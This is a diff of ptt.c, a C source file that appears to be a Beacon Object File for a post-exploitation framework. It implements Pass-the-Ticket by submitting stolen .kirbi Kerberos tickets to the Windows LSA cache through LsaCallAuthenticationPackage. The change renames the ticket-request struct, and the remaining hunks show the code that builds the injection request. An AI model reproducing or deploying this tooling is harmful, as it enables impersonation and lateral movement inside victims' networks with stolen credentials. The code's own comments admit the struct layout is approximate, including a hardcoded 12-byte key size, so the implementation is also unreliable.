@@ -2,7 +2,7 @@
  * ptt.c — Pass-the-Ticket: inject .kirbi into LSA ticket cache
  *
  * Uses secur32.dll:
- *   LsaConnectUntrusted -> LsaCallAuthenticationPackage(KERB_SUBMIT_TKT_REQUEST)
+ *   LsaConnectUntrusted -> LsaCallAuthenticationPackage(MY_KERB_SUBMIT_TKT_REQUEST)
  */
 #include <windows.h>
 #define SECURITY_WIN32
@@ -22,12 +22,12 @@ DECLSPEC_IMPORT int __cdecl MSVCRT$sscanf(const char*, const char*, ...);
 #define KerbSubmitTicketMessage 10
 
 #pragma pack(push, 1)
-typedef struct {
+typedef struct _MY_KERB_SUBMIT_TKT_REQUEST {
     ULONG MessageType;  /* KerbSubmitTicketMessage = 10 */
     LUID  LogonId;
     ULONG Flags;
     /* Followed by: KERB_CRYPTO_KEY Key; ULONG KerbCredSize; UCHAR KerbCredData[] */
-} KERB_SUBMIT_TKT_REQUEST;
+} MY_KERB_SUBMIT_TKT_REQUEST;
 #pragma pack(pop)
 
 /* Simple base64 decoder */
@@ -100,19 +100,19 @@ void go(char *args, int args_len) {
         targetLuid.HighPart = (LONG)(val >> 32);
     }
 
-    /* Build KERB_SUBMIT_TKT_REQUEST */
+    /* Build MY_KERB_SUBMIT_TKT_REQUEST */
     /* The structure is: header + KERB_CRYPTO_KEY (empty) + size + ticket data */
-    DWORD reqSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + 12 + kirbi_len;
+    DWORD reqSize = sizeof(MY_KERB_SUBMIT_TKT_REQUEST) + 12 + kirbi_len;
     /* 12 = sizeof(KERB_CRYPTO_KEY){KeyType(4) + Length(4) + Value(4=ptr)} approx */
     unsigned char *reqBuf = (unsigned char *)calloc(1, reqSize);
-    KERB_SUBMIT_TKT_REQUEST *req = (KERB_SUBMIT_TKT_REQUEST *)reqBuf;
+    MY_KERB_SUBMIT_TKT_REQUEST *req = (MY_KERB_SUBMIT_TKT_REQUEST *)reqBuf;
     req->MessageType = KerbSubmitTicketMessage;
     req->LogonId = targetLuid;
     req->Flags = 0;
 
     /* Append the KRB-CRED data after the header */
     /* Note: exact struct layout depends on Windows version. This is simplified. */
-    DWORD *pCredSize = (DWORD *)(reqBuf + sizeof(KERB_SUBMIT_TKT_REQUEST) + 12);
+    DWORD *pCredSize = (DWORD *)(reqBuf + sizeof(MY_KERB_SUBMIT_TKT_REQUEST) + 12);
 
     PVOID response = NULL;
     ULONG responseLen = 0;
